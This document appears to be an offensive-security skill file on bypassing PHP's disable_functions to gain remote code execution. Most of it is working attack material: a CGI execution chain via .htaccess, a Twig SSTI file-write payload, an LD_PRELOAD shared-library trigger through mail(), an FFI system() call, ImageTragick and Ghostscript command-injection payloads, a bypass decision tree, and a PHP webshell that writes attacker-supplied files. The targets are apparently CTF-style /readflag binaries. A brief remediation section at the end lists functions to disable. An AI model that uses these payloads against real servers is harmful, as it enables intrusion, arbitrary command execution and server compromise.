---
name: disable-functions-bypass
description: PHP disable_functions bypass techniques including file-write primitives, LD_PRELOAD, FFI, ImageMagick delegates, and CGI execution chains. Essential for RCE when standard shell functions are blocked.
---

# PHP disable_functions Bypass Techniques

## 1. Understanding disable_functions

### Detection

```bash
# Check configured disabled functions
grep -rn "disable_functions" --include="php.ini" --include="*.conf"

# Via SSTI/code execution
phpinfo() | grep disable_functions
ini_get('disable_functions')
```

### Common Disabled Functions

```
# Typically blocked
system, passthru, popen, proc_open, pcntl_exec, shell_exec,
putenv, ini_set, mail, imap_open, fsockopen, pfsockopen,
socket_create, curl_exec, curl_multi_exec
```

---

## 2. Rarely Disabled Functions (Bypass Primitives)

These functions are often **NOT** in disable_functions and provide exploitation paths:

| Function | Args | Use Case |
|----------|------|----------|
| `file_put_contents` | (file, content) | Write shells, configs |
| `file_get_contents` | (file) | Read sensitive files |
| `copy` | (src, dst) | Duplicate files |
| `rename` | (old, new) | Move files |
| `symlink` | (target, link) | Create symlinks |
| `chmod` | (file, mode) | Make files executable |
| `chown` | (file, owner) | Change ownership |
| `mkdir` | (path) | Create directories |
| `scandir` | (dir) | List directories |
| `glob` | (pattern) | Find files |
| `unlink` | (file) | Delete files |

### Quick Check

```php
// Test which functions are available
$funcs = ['file_put_contents', 'copy', 'symlink', 'chmod', 'scandir'];
foreach ($funcs as $f) {
    echo "$f: " . (function_exists($f) ? "YES" : "NO") . "\n";
}
```

---

## 3. CGI Bypass via .htaccess (CRITICAL)

**When to use:** File write primitive available + Apache with AllowOverride

### Attack Chain

```
1. Write shell script (CGI)
2. Write .htaccess to enable CGI execution
3. Access script via web → code runs outside PHP restrictions
```

### Step-by-Step Exploitation

```php
// Step 1: Write CGI shell script
$script = "#!/bin/sh\necho 'Content-Type: text/plain'\necho ''\n/readflag";
file_put_contents('/var/www/html/shell.sh', $script);

// Step 2: Make executable (if chmod available)
chmod('/var/www/html/shell.sh', 0755);

// Step 3: Write .htaccess
$htaccess = "Options +ExecCGI\nAddHandler cgi-script .sh";
file_put_contents('/var/www/html/.htaccess', $htaccess);

// Step 4: Access http://target/shell.sh
```

### Via Twig SSTI

```twig
{{['/var/www/html/drop.php','<?php file_put_contents("/var/www/html/s.sh",base64_decode("IyEvYmluL3NoCmVjaG8gQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCmVjaG8KaWQ=")); chmod("/var/www/html/s.sh",0755);?>']|sort('file_put_contents')}}
```

---

## 4. LD_PRELOAD Technique

**When to use:** `putenv` + `mail`/`imap_mail`/`error_log` NOT disabled

### How It Works

1. Upload malicious .so library
2. Set LD_PRELOAD to point to it
3. Trigger program execution (mail spawns sendmail)
4. Library code runs

### Exploitation

```php
// bypass.c - compile to bypass.so
// gcc -shared -fPIC bypass.c -o bypass.so
/*
void __attribute__((constructor)) init() {
    system(getenv("CMD"));
}
*/

// PHP exploitation
putenv("LD_PRELOAD=/tmp/bypass.so");
putenv("CMD=/readflag > /tmp/out");
mail("a@b.c", "", "");
echo file_get_contents("/tmp/out");
```

### Detection (if blocked)

```bash
grep -rn "putenv\|mail\(" --include="*.php"
```

---

## 5. FFI Bypass (PHP 7.4+)

**When to use:** FFI extension enabled (check `ffi.enable`)

### Exploitation

```php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("/readflag");
```

### Detection

```bash
# Check if FFI enabled
php -i | grep ffi.enable
grep -rn "ffi.enable" --include="php.ini"
```

---

## 6. ImageMagick Delegate Exploitation

**When to use:** ImageMagick/Imagick available, old version

### Detection

```bash
grep -rn "Imagick\|new.*Imagick" --include="*.php"
convert --version  # Check ImageMagick version
```

### Exploitation (ImageTragick - CVE-2016-3714)

```
# Create malicious MVG file
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.php?`/readflag`)'
pop graphic-context
```

---

## 7. Ghostscript Exploitation

**When to use:** PDF/PostScript processing with Ghostscript

### Detection

```bash
grep -rn "gs\|ghostscript" --include="*.php"
```

### Exploitation

```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%/readflag) currentdevice putdeviceprops
```

---

## 8. PHP-FPM Socket Exploitation

**When to use:** Access to PHP-FPM socket, can craft FastCGI packets

### Detection

```bash
ls -la /var/run/php*.sock
netstat -ln | grep 9000  # Default PHP-FPM port
```

---

## 9. Chained Bypass Strategy

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DISABLE_FUNCTIONS BYPASS DECISION TREE                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. Check for file_put_contents                                             │
│     ├─> YES: Try CGI bypass (.htaccess + shell script)                     │
│     └─> NO: Continue                                                         │
│                                                                              │
│  2. Check for putenv + mail                                                  │
│     ├─> YES: Try LD_PRELOAD bypass                                          │
│     └─> NO: Continue                                                         │
│                                                                              │
│  3. Check for FFI extension                                                  │
│     ├─> YES: FFI::cdef bypass                                               │
│     └─> NO: Continue                                                         │
│                                                                              │
│  4. Check for ImageMagick/Imagick                                           │
│     ├─> YES: Try delegate exploitation                                      │
│     └─> NO: Continue                                                         │
│                                                                              │
│  5. Check for Ghostscript                                                    │
│     ├─> YES: Try PostScript command injection                              │
│     └─> NO: Limited options - try iconv/gettext tricks                     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 10. Quick Reference Payloads

### Via Twig SSTI (JerryTok-style)

```twig
# Enumerate
{{['/']|map('scandir')|first|join(',')}}

# File write (2-arg functions via sort)
{{['/path/file.php','<?php content;?>']|sort('file_put_contents')}}

# Copy
{{['/src','/dst']|sort('copy')}}
```

### Via PHP Webshell

```php
<?php
// CGI bypass when shell functions disabled
$content = base64_decode($_POST['b64']);
file_put_contents($_POST['file'], $content);
chmod($_POST['file'], 0755);
?>
```

---

## 11. Remediation Notes

For defenders:

```ini
; php.ini - comprehensive disable_functions
disable_functions = "file_put_contents,file_get_contents,copy,rename,symlink,
chmod,chown,mkdir,rmdir,unlink,glob,scandir,putenv,mail,imap_open,
proc_open,popen,passthru,shell_exec,system,pcntl_exec,curl_exec,
curl_multi_exec,parse_ini_file,show_source,fopen,fread,fwrite,fsockopen"

; Also set
open_basedir = "/var/www/html:/tmp"
```

However, this may break legitimate functionality - always test thoroughly.
